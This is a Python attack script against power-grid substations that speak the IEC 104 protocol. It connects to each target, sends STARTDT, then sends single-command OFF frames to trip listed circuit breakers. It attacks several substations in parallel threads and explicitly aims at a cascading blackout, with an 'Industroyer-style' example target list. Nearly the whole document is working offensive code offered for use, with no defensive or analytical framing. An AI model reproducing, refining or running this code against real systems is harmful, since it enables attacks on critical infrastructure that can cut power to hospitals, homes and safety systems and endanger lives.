#!/usr/bin/env python3
"""
IEC 104 Coordinated Blackout Attack
Trip circuit breakers at multiple substations simultaneously
Causes cascading grid failure
"""

import socket
import struct
import threading
import time

class IEC104Attack:
    def __init__(self, target_ip, target_port=2404):
        self.target_ip = target_ip
        self.target_port = target_port
        self.sock = None

    def connect(self):
        """Establish IEC 104 connection"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.target_ip, self.target_port))
        print(f"[*] Connected to {self.target_ip}:{self.target_port}")

        # Send STARTDT (Start Data Transfer)
        startdt = bytes.fromhex('68 04 07 00 00 00')
        self.sock.send(startdt)
        response = self.sock.recv(1024)

        if response[2:4] == b'\x0b\x00':  # STARTDT CON
            print("[+] STARTDT confirmed")
            return True
        return False

    def send_single_command(self, ioa, command):
        """
        Send IEC 104 Single Command
        ioa: Information Object Address (breaker ID)
        command: 0x01 (ON), 0x02 (OFF)
        """
        # APDU start
        apdu_start = b'\x68'

        # APCI (I-format frame)
        apdu_length = 14
        send_seq = 0x0000
        recv_seq = 0x0000
        apci = struct.pack('<BHH', apdu_length, send_seq, recv_seq)

        # ASDU
        type_id = 45  # Single command
        vsq = 0x01    # 1 object, no sequence
        cot = 0x06    # Activation
        oa = 0x01     # Originator address
        ca = struct.pack('<H', 1)  # Common address

        # Information Object
        ioa_bytes = struct.pack('<I', ioa)[:3]  # 3-byte IOA
        sco = struct.pack('B', command | 0x80)  # Single Command Object (SE bit set)

        asdu = struct.pack('BBB', type_id, vsq, cot) + bytes([oa]) + ca + ioa_bytes + sco

        packet = apdu_start + apci + asdu

        self.sock.send(packet)
        print(f"    IOA {ioa}: Command {command} sent")

    def trip_all_breakers(self, breaker_ioa_list):
        """
        Trip all circuit breakers in list
        """
        print(f"[!] Tripping {len(breaker_ioa_list)} circuit breakers")

        for ioa in breaker_ioa_list:
            self.send_single_command(ioa, 0x02)  # OFF command
            time.sleep(0.1)  # Small delay between commands

        print("[+] All breaker trip commands sent")

    def close(self):
        """Disconnect"""
        if self.sock:
            # Send STOPDT
            stopdt = bytes.fromhex('68 04 13 00 00 00')
            self.sock.send(stopdt)
            self.sock.close()

def coordinated_blackout_attack(substation_targets):
    """
    Attack multiple substations simultaneously
    Causes grid-wide blackout

    substation_targets: dict of {IP: [breaker IOA list]}
    """
    print("[!] WARNING: Coordinated Grid Attack")
    print(f"[*] Targets: {len(substation_targets)} substations")

    threads = []

    for substation_ip, breaker_ioas in substation_targets.items():
        # Create thread for each substation attack
        thread = threading.Thread(
            target=attack_single_substation,
            args=(substation_ip, breaker_ioas)
        )
        threads.append(thread)

    # Start all attacks simultaneously
    print("[*] Initiating synchronized attack...")
    for thread in threads:
        thread.start()

    # Wait for completion
    for thread in threads:
        thread.join()

    print("[+] Coordinated attack complete")
    print("[!] Expected result: Cascading grid failure")

def attack_single_substation(ip, breaker_ioas):
    """Worker function for attacking one substation"""
    attacker = IEC104Attack(ip)

    if attacker.connect():
        attacker.trip_all_breakers(breaker_ioas)
        attacker.close()

# Example usage (Industroyer-style attack):
'''
targets = {
    '192.168.1.10': [1, 2, 3, 4, 5],    # Substation 1 - 5 breakers
    '192.168.1.11': [10, 11, 12],       # Substation 2 - 3 breakers
    '192.168.1.12': [20, 21, 22, 23]    # Substation 3 - 4 breakers
}

coordinated_blackout_attack(targets)
'''
